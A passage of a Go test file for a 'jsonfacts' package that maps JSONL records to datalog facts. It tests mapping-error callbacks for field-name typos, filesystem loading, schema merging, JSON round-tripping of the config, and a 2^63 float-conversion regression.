				// expr, so this filter reliably fails to evaluate.
				Filter: "value.cmd[5] == \"z\"",
			}},
		}},
	}
	var mappingErrs []error
	cfg.OnMappingError = func(err error) { mappingErrs = append(mappingErrs, err) }

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("LoadFS: %v", err)
	}
	if len(mappingErrs) == 0 {
		t.Error("expected OnMappingError to fire for the filter expression evaluation failure")
	}
	count := 0
	for range db.Facts("proc", 1) {
		count++
	}
	if count != 0 {
		t.Errorf("expected 0 proc facts (filter eval failed), got %d", count)
	}
}

// --- Bug: neither of the above tests actually covered the case the
// OnMappingError doc comment advertised as its motivating example: a
// field-name typo. expr-lang does not raise an error for a map field access
// that misses -- value.usrname against a record whose only field is
// "username" simply evaluates to nil, not an error -- so an arg expression
// with a typo silently emitted a fact with a Null term, and a filter
// expression with a typo (value.usrname == "bob") silently evaluated to a
// real `false` some of the time but, used bare (no comparison), coerced to
// false at the VM level via expr.AsBool() with no observable signal at all.
// These are the exact typo scenarios OnMappingError needs to catch. ---

func TestOnMappingErrorFiresOnArgFieldNameTypo(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"username":"alice"}` + "\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File: "data.jsonl",
			Mappings: []jsonfacts.Mapping{{
				Predicate: "user",
				// "usrname" is a typo for the record's actual field,
				// "username". expr-lang evaluates a missing map key to nil
				// without erroring, so this must be caught some other way.
				Args: []string{"value.usrname"},
			}},
		}},
	}
	var mappingErrs []error
	cfg.OnMappingError = func(err error) { mappingErrs = append(mappingErrs, err) }

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("LoadFS: %v", err)
	}
	if len(mappingErrs) == 0 {
		t.Fatal("expected OnMappingError to fire for the arg field-name typo (value.usrname evaluating to nil)")
	}

	// The Null term is still emitted -- this is about observability, not a
	// behavior change.
	count := 0
	for terms := range db.Facts("user", 1) {
		count++
		if _, ok := terms[0].(datalog.Null); !ok {
			t.Errorf("expected the mistyped arg to still emit a Null term, got %#v", terms[0])
		}
	}
	if count != 1 {
		t.Errorf("expected 1 user fact with a Null term, got %d", count)
	}
}

func TestOnMappingErrorFiresOnFilterFieldNameTypo(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"username":"alice"}` + "\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File: "data.jsonl",
			Mappings: []jsonfacts.Mapping{{
				Predicate: "user",
				Args:      []string{"value.username"},
				// Same typo, used bare as a filter: no comparison operator
				// around it, so the filter's actual runtime result is nil
				// itself (not a bool derived from comparing against nil),
				// exercising the non-bool-result path rather than the
				// nil-comparison-happens-to-be-false path.
				Filter: "value.usrname",
			}},
		}},
	}
	var mappingErrs []error
	cfg.OnMappingError = func(err error) { mappingErrs = append(mappingErrs, err) }

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("LoadFS: %v", err)
	}
	if len(mappingErrs) == 0 {
		t.Fatal("expected OnMappingError to fire for the filter field-name typo (value.usrname evaluating to non-bool nil)")
	}
	count := 0
	for range db.Facts("user", 1) {
		count++
	}
	if count != 0 {
		t.Errorf("expected 0 user facts (filter evaluated to nil, treated as no-match), got %d", count)
	}
}

func TestLoadFS(t *testing.T) {
	// Use fstest.MapFS to test the fs.FS loading path.
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "item",
						"args":      []string{"value.name", "value.value"},
					},
				},
			},
		},
		"declarations": []any{
			map[string]any{
				"name": "item",
				"terms": []any{
					map[string]any{"name": "name"},
					map[string]any{"name": "value"},
				},
			},
		},
	})

	schemaFS := fstest.MapFS{
		"schema.json": {Data: schemaJSON},
	}
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"name":"foo","value":42}
{"name":"bar","value":99}
`)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(schemaFS); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	count := 0
	for range db.Facts("item", 2) {
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 item facts, got %d", count)
	}

	// Verify declarations were loaded.
	declCount := 0
	for range db.Declarations() {
		declCount++
	}
	if declCount != 1 {
		t.Errorf("expected 1 declaration, got %d", declCount)
	}
}

// TestLoadFSValidatesProgrammaticConfig confirms that LoadFS itself validates
// the Config, so a Config built programmatically (never routed through
// LoadSchemaFS/loadSchemaFile) still has its mapping-mode conflicts caught
// rather than silently reaching the loader.
func TestLoadFSValidatesProgrammaticConfig(t *testing.T) {
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{
			{
				File: "data.jsonl",
				Mappings: []jsonfacts.Mapping{
					{
						// Both expr and predicate/args/filter set: mutually exclusive.
						Predicate: "foo",
						Args:      []string{"value.x"},
						Expr:      `assert("foo", [value.x])`,
					},
				},
			},
		},
	}

	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"x":1}` + "\n")},
	}

	if _, err := cfg.LoadFS(dataFS); err == nil {
		t.Fatal("expected LoadFS to reject a programmatically-built config with a conflicting mapping, got nil error")
	}
}

func TestMultipleSchemas(t *testing.T) {
	// Simulate loading two separate schema files and merging them.
	schema1, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "alerts.jsonl",
				"mappings": []any{
					map[string]any{"predicate": "alert", "args": []string{"value.id", "value.severity"}},
				},
			},
		},
	})
	schema2, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "network.jsonl",
				"mappings": []any{
					map[string]any{"predicate": "conn", "args": []string{"value.src", "value.dst"}},
				},
			},
		},
	})

	schemaFS := fstest.MapFS{
		"alerts.json":  {Data: schema1},
		"network.json": {Data: schema2},
	}
	dataFS := fstest.MapFS{
		"alerts.jsonl":  {Data: []byte(`{"id":"a1","severity":"High"}`)},
		"network.jsonl": {Data: []byte(`{"src":"10.0.0.1","dst":"10.0.0.2"}`)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(schemaFS); err != nil {
		t.Fatal(err)
	}

	// Verify both sources were merged.
	if len(cfg.Sources) != 2 {
		t.Fatalf("expected 2 sources, got %d", len(cfg.Sources))
	}

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	alertCount := 0
	for range db.Facts("alert", 2) {
		alertCount++
	}
	connCount := 0
	for range db.Facts("conn", 2) {
		connCount++
	}
	if alertCount != 1 {
		t.Errorf("expected 1 alert, got %d", alertCount)
	}
	if connCount != 1 {
		t.Errorf("expected 1 conn, got %d", connCount)
	}
}

func TestConfigJSON(t *testing.T) {
	// Verify Config round-trips through JSON.
	var cfg jsonfacts.Config
	cfg.Sources = []jsonfacts.Source{
		{File: "data.jsonl", Mappings: []jsonfacts.Mapping{
			{Predicate: "item", Args: []string{"value.x"}},
		}},
	}
	cfg.Matchers = []jsonfacts.Matcher{
		{Predicate: "item", Term: 0, Contains: []string{"foo"}},
	}
	cfg.Declarations = []datalog.Declaration{
		{Name: "item", Terms: []datalog.TermDeclaration{{Name: "x"}}},
	}

	data, err := json.Marshal(&cfg)
	if err != nil {
		t.Fatal(err)
	}

	var cfg2 jsonfacts.Config
	if err := json.Unmarshal(data, &cfg2); err != nil {
		t.Fatal(err)
	}

	if len(cfg2.Sources) != 1 {
		t.Errorf("expected 1 source, got %d", len(cfg2.Sources))
	}
	if len(cfg2.Matchers) != 1 {
		t.Errorf("expected 1 matcher, got %d", len(cfg2.Matchers))
	}
	if len(cfg2.Declarations) != 1 {
		t.Errorf("expected 1 declaration, got %d", len(cfg2.Declarations))
	}
	if cfg2.Declarations[0].Terms[0].Name != "x" {
		t.Errorf("expected term name 'x', got %q", cfg2.Declarations[0].Terms[0].Name)
	}
}

// TestNormalizeToConstantTwoTo63StaysFloat is the regression test for the
// platform-dependent float->int64 conversion in normalizeToConstant
// (jsonfacts/loader.go). A JSONL number beyond the int64 range
// (9223372036854775808 == 2^63) decodes to float64 exactly 2^63, and a
// mapping expression forwards that float64 to normalizeToConstant. The old
// unbounded round-trip guard (int64(val); float64(i) == val) was unsound on
// arm64: FCVTZS saturates 2^63 to MaxInt64 and float64(MaxInt64) rounds back
// up to exactly 2^63, so the guard passed and the value silently became
// Integer(MaxInt64) -- one off and divergent from amd64, which kept it a
// Float. normalizeToConstant now routes through interned.NormalizeNumeric,
// which range-checks before converting, so 2^63 stays a Float on every
// platform.
func TestNormalizeToConstantTwoTo63StaysFloat(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "big.jsonl", `{"id":9223372036854775808}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "big.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "big",
						"args":      []string{"value.id"},
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	var rows [][]datalog.Constant
	for row := range db.Facts("big", 1) {
		rows = append(rows, row)
	}
	if len(rows) != 1 {
		t.Fatalf("expected 1 big fact, got %d", len(rows))
	}

	got, ok := rows[0][0].(datalog.Float)
	if !ok {
		t.Fatalf("expected datalog.Float for 2^63, got %T (%v) -- "+
			"normalizeToConstant collapsed an out-of-range float to int64",
			rows[0][0], rows[0][0])
	}
	const twoTo63 = 9223372036854775808.0
	if float64(got) != twoTo63 {
		t.Fatalf("expected Float(2^63) = %v, got %v", twoTo63, got)
	}
}
